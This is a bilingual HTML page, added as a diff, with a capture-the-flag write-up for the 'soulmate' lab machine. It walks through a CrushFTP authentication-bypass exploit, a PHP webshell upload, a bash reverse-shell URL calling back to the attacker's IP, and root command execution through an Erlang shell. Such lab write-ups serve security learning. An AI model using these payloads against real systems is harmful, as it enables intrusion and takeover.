@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>soulmate | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">soulmate</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running CrushFTP on a subdomain accessible through virtual host enumeration. Initial reconnaissance revealed a dating website on the main domain and a CrushFTP administration panel on <code>ftp.soulmate.htb</code>.</p>
+                    
+                    <p>To gain access, I exploited CVE-2025-31161, a race condition authentication bypass vulnerability in CrushFTP that allowed me to create an administrative user. Once authenticated, I reset the password for the existing user <code>ben</code> who had filesystem access to the web application directory. I then uploaded a PHP webshell and gained initial shell access as <code>www-data</code>.</p>
+                    
+                    <p>Lateral movement to user <code>ben</code> was achieved by discovering hardcoded credentials in an Erlang SSH service configuration file. For privilege escalation to root, I exploited the Erlang SSH shell by executing OS commands through the Erlang <code>os:cmd()</code> function, which was running as root, allowing me to add <code>ben</code> to the <code>sudo</code> group and obtain full root access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> CrushFTP authentication bypass (CVE-2025-31161), virtual host enumeration, PHP webshell upload, Erlang SSH command injection, sudo privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and other services" /></p>
+
+                <p>Based on the scan results, I add <code>soulmate.htb</code> to my <code>/etc/hosts</code> file to resolve the domain properly.</p>
+
+                <h2>Web Enumeration - Main Site</h2>
+                <p>Running <code>whatweb</code> against the target reveals it's running PHP with nginx on Ubuntu Linux:</p>
+                <pre><code class="language-bash">whatweb http://soulmate.htb/</code></pre>
+
+                <p>The output shows:</p>
+                <pre><code class="language-plaintext">http://soulmate.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], 
+Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.86], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]</code></pre>
+
+                <p>Navigating to the website, I discover it's a dating website application. Users can create profiles and upload images.</p>
+
+                <h3>Directory Enumeration</h3>
+                <p>I run gobuster to enumerate directories and files on the web server:</p>
+                <p><img src="./media/image1.png" alt="Gobuster directory enumeration results showing common web paths" /></p>
+
+                <p>The results don't reveal any particularly interesting paths beyond the standard web application structure.</p>
+
+                <h3>Testing File Upload Functionality</h3>
+                <p>One interesting feature is the profile image upload functionality. I test uploading a legitimate image to see how the application handles files. The uploaded image is stored at <code>/assets/images/profiles/3_1760092004.jpg</code>, suggesting a predictable naming pattern.</p>
+
+                <p>I attempt to upload a PHP webshell disguised as an image, but the application appears to have proper file validation in place, preventing direct exploitation through this vector.</p>
+
+                <h2>Virtual Host Discovery</h2>
+                <p>While continuing enumeration, I leave gobuster running in vhost enumeration mode. It discovers an interesting subdomain:</p>
+                <pre><code class="language-plaintext">ftp.soulmate.htb Status: 302 [Size: 0] [--&gt; /WebInterface/login.html]</code></pre>
+
+                <p>I add <code>ftp.soulmate.htb</code> to my <code>/etc/hosts</code> file and navigate to it.</p>
+
+                <h2>CrushFTP Discovery and Exploitation</h2>
+                <p>Accessing <code>ftp.soulmate.htb</code> redirects to <code>/WebInterface/login.html</code>, revealing a CrushFTP login panel:</p>
+                <p><img src="./media/image4.png" alt="CrushFTP web interface login page showing the authentication form" /></p>
+
+                <p>I try default credentials with the username <code>crushadmin</code> (which appears to be the default administrative account), but they don't work.</p>
+
+                <h3>Vulnerability Research</h3>
+                <p>Searching for recent CrushFTP exploits, I discover two recent authentication bypass CVEs:</p>
+                <ul>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31161">CVE-2025-31161</a> - Authentication bypass via race condition</li>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-54309">CVE-2025-54309</a> - Username enumeration via race condition</li>
+                </ul>
+
+                <p>Although the CrushFTP version isn't immediately visible, I decide to test both vulnerabilities.</p>
+
+                <h3>CVE-2025-54309 - User Enumeration</h3>
+                <p>I first test CVE-2025-54309, which exploits a race condition to enumerate users. The exploit works by sending paired requests - one to change the username to <code>crushadmin</code> and another to extract the user list. During a very brief window, the name-changed user is treated as an admin.</p>
+
+                <p>After running the exploit for a while, it successfully exfiltrates usernames:</p>
+                <pre><code class="language-plaintext">[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount</code></pre>
+
+                <p>While this proof-of-concept only extracts usernames, the same technique could theoretically be used for more extensive exploitation. However, since this is a very recent vulnerability, there aren't many mature public exploits available.</p>
+
+                <h3>CVE-2025-31161 - Account Creation</h3>
+                <p>I then find a more useful exploit for CVE-2025-31161: <a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">https://github.com/Immersive-Labs-Sec/CVE-2025-31161</a></p>
+
+                <p>This exploit allows me to create a new administrative user by exploiting another race condition in the authorization mechanism:</p>
+                <pre><code class="language-bash">python3 xd.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user xd --password asd</code></pre>
+
+                <p>The exploit successfully creates the account:</p>
+                <pre><code class="language-plaintext">[+] Preparing Payloads
+[-] Warming up the target
+[+] Sending Account Create Request
+[!] User created successfully
+[+] Exploit Complete you can now login with
+[*] Username: xd
+[*] Password: asd</code></pre>
+
+                <h2>Post-Exploitation - CrushFTP Access</h2>
+                <p>After logging in with my newly created user <code>xd:asd</code>, I explore the CrushFTP interface. I discover that the user <code>ben</code> has access to the web directories for <code>soulmate.htb</code>:</p>
+                <p><img src="./media/image5.png" alt="CrushFTP file manager showing ben's access to the web application directories" /></p>
+
+                <p>This is a critical finding - if I can access ben's account, I can upload files directly to the web root.</p>
+
+                <h3>Resetting Ben's Password</h3>
+                <p>Using my administrative access through the CrushFTP panel, I reset the password for user <code>ben</code>:</p>
+                <pre><code class="language-plaintext">ben:uZe4BY</code></pre>
+
+                <h2>Webshell Upload and Initial Access</h2>
+                <p>Now authenticated as <code>ben</code> in CrushFTP, I upload a PHP webshell to the web application directory:</p>
+                <p><img src="./media/image2.png" alt="Uploading a PHP webshell through the CrushFTP file manager interface" /></p>
+
+                <p>I verify the webshell is working by accessing it through the browser:</p>
+                <p><img src="./media/image6.png" alt="Webshell execution showing successful command output in the browser" /></p>
+
+                <p>The webshell executes commands successfully. I now use it to send myself a reverse shell:</p>
+                <pre><code class="language-bash">http://soulmate.htb/xd.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.10.16.6/443+0%3E%261%22</code></pre>
+
+                <p>With a netcat listener ready, I receive the connection and gain shell access as <code>www-data</code>.</p>
+
+                <h2>Credential Hunting and Lateral Movement</h2>
+                <p>As <code>www-data</code>, I begin searching for credentials and useful information in the web application files.</p>
+
+                <h3>Database Credentials</h3>
+                <p>In <code>config.php</code>, I find the CrushFTP admin password:</p>
+                <pre><code class="language-plaintext">Crush4dmin990</code></pre>
+
+                <p>I also discover a bcrypt hash in an SQLite database:</p>
+                <pre><code class="language-plaintext">$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2</code></pre>
+
+                <p>I attempt to crack it using hashcat with bcrypt mode (3200), but it doesn't crack with common wordlists.</p>
+
+                <h3>Process Enumeration</h3>
+                <p>Running <code>ps -faux</code>, I notice an interesting process running as root:</p>
+                <pre><code class="language-bash">root 1066 0.0 1.6 2252952 67412 ? Ssl 19:23 0:03 /usr/local/lib/erlang_login/start.escript 
+-B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl 
+-- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- 
+-kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript</code></pre>
+
+                <p>This appears to be an Erlang-based SSH service. I investigate the directory <code>/usr/local/lib/erlang_login</code> to examine the Erlang scripts.</p>
+
+                <h3>Hardcoded Credentials Discovery</h3>
+                <p>Examining the Erlang configuration files, I discover hardcoded credentials for the SSH service running on port 2222:</p>
+                <pre><code class="language-erlang">{user_passwords, [{"ben", "HouseH0ldings998"}]},</code></pre>
+
+                <p>These credentials allow SSH access to an Erlang shell rather than a traditional bash shell.</p>
+
+                <h2>User Flag - Access as Ben</h2>
+                <p>Using the discovered credentials, I switch to user <code>ben</code>:</p>
+                <pre><code class="language-bash">su ben
+# Password: HouseH0ldings998</code></pre>
+
+                <p>I successfully retrieve the user flag from ben's home directory.</p>
+
+                <h2>Privilege Escalation - Erlang SSH Exploitation</h2>
+                <p>I connect to the Erlang SSH service to understand how it works:</p>
+                <pre><code class="language-bash">ssh -p 2222 ben@localhost
+# Password: HouseH0ldings998</code></pre>
+
+                <p>This drops me into an Erlang shell:</p>
+                <pre><code class="language-erlang">Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
+(ssh_runner@soulmate)1></code></pre>
+
+                <h3>Erlang Command Execution</h3>
+                <p>After researching Erlang shell commands, I discover that I can execute OS commands using the <code>os:cmd()</code> function. I test basic command execution:</p>
+                <pre><code class="language-erlang">os:cmd("id").</code></pre>
+
+                <p>Since this Erlang process is running as root (as seen in the process list earlier), any commands executed through <code>os:cmd()</code> will run with root privileges.</p>
+
+                <h3>Adding Ben to Sudo Group</h3>
+                <p>I exploit this by adding user <code>ben</code> to the <code>sudo</code> group:</p>
+                <pre><code class="language-erlang">os:cmd('sudo usermod -aG sudo ben').</code></pre>
+
+                <p>After executing this command, I exit the Erlang shell and log back in as <code>ben</code>. Verifying my group membership:</p>
+                <pre><code class="language-bash">id</code></pre>
+
+                <pre><code class="language-plaintext">uid=1000(ben) gid=1000(ben) groups=1000(ben),27(sudo)</code></pre>
+
+                <p>I'm now in the <code>sudo</code> group. Checking sudo permissions:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User ben may run the following commands on soulmate:
+    (ALL : ALL) ALL</code></pre>
+
+                <h2>Root Access</h2>
+                <p>With full sudo privileges, I escalate to root:</p>
+                <pre><code class="language-bash">sudo su</code></pre>
+
+                <p>I successfully obtain root access and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba CrushFTP en un subdominio accesible mediante enumeración de virtual hosts. El reconocimiento inicial reveló una web de citas en el dominio principal y un panel de administración de CrushFTP en <code>ftp.soulmate.htb</code>.</p>
+                    
+                    <p>Para obtener acceso, exploté CVE-2025-31161, una vulnerabilidad de bypass de autenticación mediante race condition en CrushFTP que me permitió crear un usuario administrativo. Una vez autenticado, restablecí la contraseña del usuario existente <code>ben</code> que tenía acceso al sistema de archivos del directorio de la aplicación web. Luego subí una webshell en PHP y obtuve acceso shell inicial como <code>www-data</code>.</p>
+                    
+                    <p>El movimiento lateral al usuario <code>ben</code> se consiguió descubriendo credenciales hardcodeadas en un archivo de configuración del servicio SSH de Erlang. Para la escalada de privilegios a root, exploté el shell SSH de Erlang ejecutando comandos del sistema operativo mediante la función <code>os:cmd()</code> de Erlang, que se ejecutaba como root, permitiéndome añadir a <code>ben</code> al grupo <code>sudo</code> y obtener acceso root completo.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Bypass de autenticación en CrushFTP (CVE-2025-31161), enumeración de virtual hosts, subida de webshell PHP, inyección de comandos en SSH de Erlang, escalada de privilegios mediante sudo.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80 y otros servicios" /></p>
+
+                <p>Basándome en los resultados del escaneo, añado <code>soulmate.htb</code> a mi archivo <code>/etc/hosts</code> para resolver correctamente el dominio.</p>
+
+                <h2>Enumeración Web - Sitio Principal</h2>
+                <p>Ejecutando <code>whatweb</code> contra el objetivo revela que ejecuta PHP con nginx sobre Ubuntu Linux:</p>
+                <pre><code class="language-bash">whatweb http://soulmate.htb/</code></pre>
+
+                <p>La salida muestra:</p>
+                <pre><code class="language-plaintext">http://soulmate.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], 
+Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.86], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]</code></pre>
+
+                <p>Navegando a la web, descubro que es una aplicación de citas. Los usuarios pueden crear perfiles y subir imágenes.</p>
+
+                <h3>Enumeración de Directorios</h3>
+                <p>Ejecuto gobuster para enumerar directorios y archivos en el servidor web:</p>
+                <p><img src="./media/image1.png" alt="Resultados de la enumeración de directorios con gobuster mostrando rutas web comunes" /></p>
+
+                <p>Los resultados no revelan rutas particularmente interesantes más allá de la estructura estándar de la aplicación web.</p>
+
+                <h3>Probando la Funcionalidad de Subida de Archivos</h3>
+                <p>Una característica interesante es la funcionalidad de subida de imágenes de perfil. Pruebo subiendo una imagen legítima para ver cómo maneja la aplicación los archivos. La imagen subida se almacena en <code>/assets/images/profiles/3_1760092004.jpg</code>, sugiriendo un patrón de nomenclatura predecible.</p>
+
+                <p>Intento subir una webshell en PHP disfrazada como imagen, pero la aplicación parece tener validación de archivos apropiada, impidiendo la explotación directa mediante este vector.</p>
+
+                <h2>Descubrimiento de Virtual Hosts</h2>
+                <p>Mientras continúo con la enumeración, dejo gobuster ejecutándose en modo de enumeración de vhosts. Descubre un subdominio interesante:</p>
+                <pre><code class="language-plaintext">ftp.soulmate.htb Status: 302 [Size: 0] [--&gt; /WebInterface/login.html]</code></pre>
+
+                <p>Añado <code>ftp.soulmate.htb</code> a mi archivo <code>/etc/hosts</code> y navego hacia él.</p>
+
+                <h2>Descubrimiento y Explotación de CrushFTP</h2>
+                <p>Accediendo a <code>ftp.soulmate.htb</code> redirige a <code>/WebInterface/login.html</code>, revelando un panel de login de CrushFTP:</p>
+                <p><img src="./media/image4.png" alt="Interfaz web de CrushFTP mostrando la página de login con el formulario de autenticación" /></p>
+
+                <p>Pruebo credenciales por defecto con el nombre de usuario <code>crushadmin</code> (que parece ser la cuenta administrativa por defecto), pero no funcionan.</p>
+
+                <h3>Investigación de Vulnerabilidades</h3>
+                <p>Buscando exploits recientes de CrushFTP, descubro dos CVEs recientes de bypass de autenticación:</p>
+                <ul>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31161">CVE-2025-31161</a> - Bypass de autenticación mediante race condition</li>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-54309">CVE-2025-54309</a> - Enumeración de usuarios mediante race condition</li>
+                </ul>
+
+                <p>Aunque la versión de CrushFTP no es inmediatamente visible, decido probar ambas vulnerabilidades.</p>
+
+                <h3>CVE-2025-54309 - Enumeración de Usuarios</h3>
+                <p>Primero pruebo CVE-2025-54309, que explota una race condition para enumerar usuarios. El exploit funciona enviando peticiones emparejadas - una para cambiar el nombre de usuario a <code>crushadmin</code> y otra para extraer la lista de usuarios. Durante una ventana muy breve, el usuario que ha cambiado de nombre es tratado como admin.</p>
+
+                <p>Después de ejecutar el exploit durante un rato, exfiltra exitosamente nombres de usuario:</p>
+                <pre><code class="language-plaintext">[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount</code></pre>
+
+                <p>Aunque esta prueba de concepto solo extrae nombres de usuario, la misma técnica podría teóricamente usarse para explotación más extensa. Sin embargo, al ser una vulnerabilidad muy reciente, no hay muchos exploits públicos maduros disponibles.</p>
+
+                <h3>CVE-2025-31161 - Creación de Cuentas</h3>
+                <p>Luego encuentro un exploit más útil para CVE-2025-31161: <a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">https://github.com/Immersive-Labs-Sec/CVE-2025-31161</a></p>
+
+                <p>Este exploit me permite crear un nuevo usuario administrativo explotando otra race condition en el mecanismo de autorización:</p>
+                <pre><code class="language-bash">python3 xd.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user xd --password asd</code></pre>
+
+                <p>El exploit crea exitosamente la cuenta:</p>
+                <pre><code class="language-plaintext">[+] Preparing Payloads
+[-] Warming up the target
+[+] Sending Account Create Request
+[!] User created successfully
+[+] Exploit Complete you can now login with
+[*] Username: xd
+[*] Password: asd</code></pre>
+
+                <h2>Post-Explotación - Acceso a CrushFTP</h2>
+                <p>Después de iniciar sesión con mi usuario recién creado <code>xd:asd</code>, exploro la interfaz de CrushFTP. Descubro que el usuario <code>ben</code> tiene acceso a los directorios web de <code>soulmate.htb</code>:</p>
+                <p><img src="./media/image5.png" alt="Gestor de archivos de CrushFTP mostrando el acceso de ben a los directorios de la aplicación web" /></p>
+
+                <p>Este es un hallazgo crítico - si puedo acceder a la cuenta de ben, puedo subir archivos directamente a la raíz web.</p>
+
+                <h3>Restableciendo la Contraseña de Ben</h3>
+                <p>Usando mi acceso administrativo a través del panel de CrushFTP, restablezco la contraseña del usuario <code>ben</code>:</p>
+                <pre><code class="language-plaintext">ben:uZe4BY</code></pre>
+
+                <h2>Subida de Webshell y Acceso Inicial</h2>
+                <p>Ahora autenticado como <code>ben</code> en CrushFTP, subo una webshell en PHP al directorio de la aplicación web:</p>
+                <p><img src="./media/image2.png" alt="Subiendo una webshell en PHP mediante la interfaz del gestor de archivos de CrushFTP" /></p>
+
+                <p>Verifico que la webshell funciona accediendo a ella mediante el navegador:</p>
+                <p><img src="./media/image6.png" alt="Ejecución de la webshell mostrando salida de comandos exitosa en el navegador" /></p>
+
+                <p>La webshell ejecuta comandos exitosamente. Ahora la uso para enviarme una reverse shell:</p>
+                <pre><code class="language-bash">http://soulmate.htb/xd.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.10.16.6/443+0%3E%261%22</code></pre>
+
+                <p>Con un listener de netcat preparado, recibo la conexión y obtengo acceso shell como <code>www-data</code>.</p>
+
+                <h2>Búsqueda de Credenciales y Movimiento Lateral</h2>
+                <p>Como <code>www-data</code>, comienzo a buscar credenciales e información útil en los archivos de la aplicación web.</p>
+
+                <h3>Credenciales de Base de Datos</h3>
+                <p>En <code>config.php</code>, encuentro la contraseña del admin de CrushFTP:</p>
+                <pre><code class="language-plaintext">Crush4dmin990</code></pre>
+
+                <p>También descubro un hash bcrypt en una base de datos SQLite:</p>
+                <pre><code class="language-plaintext">$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2</code></pre>
+
+                <p>Intento crackearlo usando hashcat con el modo bcrypt (3200), pero no se crackea con diccionarios comunes.</p>
+
+                <h3>Enumeración de Procesos</h3>
+                <p>Ejecutando <code>ps -faux</code>, noto un proceso interesante ejecutándose como root:</p>
+                <pre><code class="language-bash">root 1066 0.0 1.6 2252952 67412 ? Ssl 19:23 0:03 /usr/local/lib/erlang_login/start.escript 
+-B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl 
+-- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- 
+-kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript</code></pre>
+
+                <p>Parece ser un servicio SSH basado en Erlang. Investigo el directorio <code>/usr/local/lib/erlang_login</code> para examinar los scripts de Erlang.</p>
+
+                <h3>Descubrimiento de Credenciales Hardcodeadas</h3>
+                <p>Examinando los archivos de configuración de Erlang, descubro credenciales hardcodeadas para el servicio SSH ejecutándose en el puerto 2222:</p>
+                <pre><code class="language-erlang">{user_passwords, [{"ben", "HouseH0ldings998"}]},</code></pre>
+
+                <p>Estas credenciales permiten acceso SSH a un shell de Erlang en lugar de un shell bash tradicional.</p>
+
+                <h2>Flag de Usuario - Acceso como Ben</h2>
+                <p>Usando las credenciales descubiertas, cambio al usuario <code>ben</code>:</p>
+                <pre><code class="language-bash">su ben
+# Password: HouseH0ldings998</code></pre>
+
+                <p>Consigo exitosamente la flag de usuario del directorio home de ben.</p>
+
+                <h2>Escalada de Privilegios - Explotación del SSH de Erlang</h2>
+                <p>Me conecto al servicio SSH de Erlang para entender cómo funciona:</p>
+                <pre><code class="language-bash">ssh -p 2222 ben@localhost
+# Password: HouseH0ldings998</code></pre>
+
+                <p>Esto me deja en un shell de Erlang:</p>
+                <pre><code class="language-erlang">Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
+(ssh_runner@soulmate)1></code></pre>
+
+                <h3>Ejecución de Comandos en Erlang</h3>
+                <p>Después de investigar comandos del shell de Erlang, descubro que puedo ejecutar comandos del sistema operativo usando la función <code>os:cmd()</code>. Pruebo ejecución básica de comandos:</p>
+                <pre><code class="language-erlang">os:cmd("id").</code></pre>
+
+                <p>Como este proceso de Erlang se está ejecutando como root (según vimos en la lista de procesos anteriormente), cualquier comando ejecutado mediante <code>os:cmd()</code> se ejecutará con privilegios de root.</p>
+
+                <h3>Añadiendo a Ben al Grupo Sudo</h3>
+                <p>Exploto esto añadiendo al usuario <code>ben</code> al grupo <code>sudo</code>:</p>
+                <pre><code class="language-erlang">os:cmd('sudo usermod -aG sudo ben').</code></pre>
+
+                <p>Después de ejecutar este comando, salgo del shell de Erlang y vuelvo a iniciar sesión como <code>ben</code>. Verificando mi pertenencia a grupos:</p>
+                <pre><code class="language-bash">id</code></pre>
+
+                <pre><code class="language-plaintext">uid=1000(ben) gid=1000(ben) groups=1000(ben),27(sudo)</code></pre>
+
+                <p>Ahora estoy en el grupo <code>sudo</code>. Comprobando permisos sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User ben may run the following commands on soulmate:
+    (ALL : ALL) ALL</code></pre>
+
+                <h2>Acceso Root</h2>
+                <p>Con privilegios sudo completos, escalo a root:</p>
+                <pre><code class="language-bash">sudo su</code></pre>
+
+                <p>Obtengo exitosamente acceso root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
